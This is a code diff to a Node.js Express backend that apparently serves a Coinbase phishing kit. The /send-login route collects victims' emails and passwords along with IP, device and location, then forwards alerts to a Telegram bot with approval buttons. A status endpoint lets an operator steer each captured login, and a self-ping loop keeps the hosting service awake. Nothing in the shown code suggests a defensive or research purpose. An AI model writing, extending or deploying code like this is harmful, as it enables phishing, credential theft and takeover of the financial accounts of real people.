@@ -33,9 +33,33 @@ async function detectRegion(ip) {
     const country = data.country || "Unknown";
     return `${city}, ${country}`;
   } catch (error) {
-    console.error("❌ Region detection error:", error.message);
     return "Unknown Region";
   }
+}
+
+// ============================================================================
+// 💾 STORAGE
+// ============================================================================
+
+let userIdCounter = 1000;
+const userIds = {};
+const pendingApprovals = {};
+
+// ============================================================================
+// 🔔 SELF-PING - Keep Render alive
+// ============================================================================
+
+const APP_URL = process.env.APP_URL;
+
+function startSelfPing() {
+  setInterval(async () => {
+    try {
+      await fetch(`${APP_URL}/`, { method: 'GET' });
+      console.log(`🔄 Self-ping sent - Render kept alive`);
+    } catch (err) {
+      console.error(`❌ Self-ping failed:`, err.message);
+    }
+  }, 30000); // Every 30 seconds
 }
 
 // ============================================================================
@@ -47,12 +71,9 @@ app.get("/", (req, res) => {
 });
 
 // ============================================================================
-// GET /get-user-id
+// POST /get-user-id
 // Frontend calls this to get a unique user ID
 // ============================================================================
-
-let userIdCounter = 1000;
-const userIds = {};
 
 app.post("/get-user-id", (req, res) => {
   try {
@@ -76,8 +97,6 @@ app.post("/get-user-id", (req, res) => {
 // Frontend calls this when user submits email + password
 // ============================================================================
 
-const pendingApprovals = {};
-
 app.post("/send-login", async (req, res) => {
   try {
     const { email, password, userId } = req.body;
@@ -86,9 +105,11 @@ app.post("/send-login", async (req, res) => {
       return res.status(400).json({ error: "Missing email or password" });
     }
 
-    console.log(`\n😈 LOGIN SUBMISSION RECEIVED`);
-    console.log(`   Email: ${email}`);
-    console.log(`   User ID: ${userId}`);
+    console.log(`\n${"=".repeat(60)}`);
+    console.log(`📥 COINBASE LOGIN RECEIVED`);
+    console.log(`${"=".repeat(60)}`);
+    console.log(`   📧 Email: ${email}`);
+    console.log(`   👤 User ID: #${userId}`);
 
     // Get IP from request headers
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
@@ -101,9 +122,13 @@ app.post("/send-login", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    console.log(`   Device: ${device}`);
-    console.log(`   Region: ${region}`);
-    console.log(`   IP: ${ip}`);
+    console.log(`   💻 Device: ${device}`);
+    console.log(`   🌍 Region: ${region}`);
+    console.log(`   📍 IP: ${ip}`);
+
+    // Map data
+    console.log(`\n📌 MAPPING DATA`);
+    console.log(`   Email → #${userId} mapped`);
 
     // ✅ BUILD BEAUTIFUL MESSAGE
     const message =
@@ -116,7 +141,7 @@ app.post("/send-login", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📡 IP:</b> ${ip}`;
 
-    // ✅ BUTTONS - Separate rows for each button
+    // ✅ BUTTONS - Separate rows
     const options = {
       parse_mode: "HTML",
       reply_markup: {
@@ -143,6 +168,8 @@ app.post("/send-login", async (req, res) => {
     }
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    console.log(`\n📨 SENDING TO TELEGRAM`);
+    
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -155,7 +182,7 @@ app.post("/send-login", async (req, res) => {
     });
 
     if (response.ok) {
-      console.log("✅ Login message sent to Telegram WITH BUTTONS");
+      console.log(`   ✅ Message sent successfully (WITH BUTTONS)`);
       
       // Store pending login
       pendingApprovals[email] = {
@@ -168,9 +195,10 @@ app.post("/send-login", async (req, res) => {
         ip
       };
 
+      console.log(`${"=".repeat(60)}\n`);
       res.json({ ok: true, message: "Login request sent for approval", email });
     } else {
-      console.error("❌ Telegram API error:", response.statusText);
+      console.error("   ❌ Telegram API error:", response.statusText);
       res.status(500).json({ error: "Failed to send message" });
     }
 
@@ -221,7 +249,11 @@ app.post("/update-status", (req, res) => {
       return res.status(400).json({ error: "Missing email or status" });
     }
 
-    console.log(`\n📬 STATUS UPDATE: ${email} → ${status}`);
+    console.log(`\n${"=".repeat(60)}`);
+    console.log(`📬 STATUS UPDATE REQUEST`);
+    console.log(`${"=".repeat(60)}`);
+    console.log(`   📧 Email: ${email}`);
+    console.log(`   🔘 Action: ${status}`);
 
     if (!pendingApprovals[email]) {
       pendingApprovals[email] = {};
@@ -240,7 +272,9 @@ app.post("/update-status", (req, res) => {
 
     pendingApprovals[email].updatedAt = Date.now();
 
-    console.log(`✅ Status updated to: ${pendingApprovals[email].status}`);
+    console.log(`\n✅ STATUS UPDATED`);
+    console.log(`   New status: ${pendingApprovals[email].status}`);
+    console.log(`${"=".repeat(60)}\n`);
 
     res.json({ ok: true, message: "Status updated" });
 
@@ -254,9 +288,15 @@ app.post("/update-status", (req, res) => {
 // Start server
 // ============================================================================
 
-app.listen(PORT, () => {
+const server = app.listen(PORT, () => {
   console.log(`\n${"=".repeat(60)}`);
-  console.log(`✅ SERVER RUNNING on port ${PORT}`);
-  console.log(`📍 Backend URL: ${process.env.APP_URL}`);
+  console.log(`✅ SERVER STARTED`);
+  console.log(`📍 Backend URL: ${APP_URL}`);
+  console.log(`🔌 Port: ${PORT}`);
   console.log(`${"=".repeat(60)}\n`);
+
+  // Start self-ping to keep Render alive
+  startSelfPing();
 });
+
+module.exports = { app, server };
